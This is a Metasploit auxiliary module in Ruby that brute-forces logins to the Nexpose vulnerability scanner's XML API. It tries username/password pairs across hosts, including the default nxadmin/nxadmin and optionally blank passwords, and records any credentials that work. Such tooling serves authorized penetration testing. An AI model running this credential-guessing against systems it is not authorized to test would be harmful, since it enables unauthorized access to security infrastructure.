##
# nexpose_api_login.rb
##

##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'NeXpose API Interface Login Utility',
      'Description'    => %q{
        This module simply attempts to login to a NeXpose API interface using a
        specific user/pass.
      },
      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(3780),
        OptString.new('URI', [true, "URI for NeXpose API. Default is /api/1.1/xml", "/api/1.1/xml"]),
        OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false])
      ], self.class)

    register_advanced_options(
    [
      OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
    ], self.class)
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'uri'     => datastore['URI'],
        'method'  => 'GET'
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("#{datastore['URI']} - #{e.to_s}")
      return
    end

    if not res
      vprint_error("#{datastore['URI']} - No response")
      return
    end
    if res.code != 200
      vprint_error("Did not get 200 for API XML interface")
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def do_login(user='nxadmin', pass='nxadmin')
    vprint_status("Trying username:'#{user}' with password:'#{pass}'")
    headers = {
      'Content-Type' => 'text/xml'
    }
    data = '<?xml version="1.0" encoding="UTF-8"?><LoginRequest sync-id="1" user-id="' << user << '" password="' << pass  << '"></LoginRequest>'
    begin
      res = send_request_cgi({
        'encode'   => true,
        'uri'      => datastore['URI'],
        'method'   => 'POST',
        'headers'  => headers,
        'data'     => data
      }, 25)

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("HTTP Connection Error - res, Aborting")
      return :abort
    end

    if res.code != 200
      vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
      return :skip_pass
    end

    if res.code == 200
      if res.body =~ /LoginResponse.*success="1"/
        print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

        report_hash = {
          :host   => datastore['RHOST'],
          :port   => datastore['RPORT'],
          :sname  => 'nexpose',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'}

        report_auth_info(report_hash)
        return :next_user
      end
    end
    vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
    return :skip_pass
  end
end
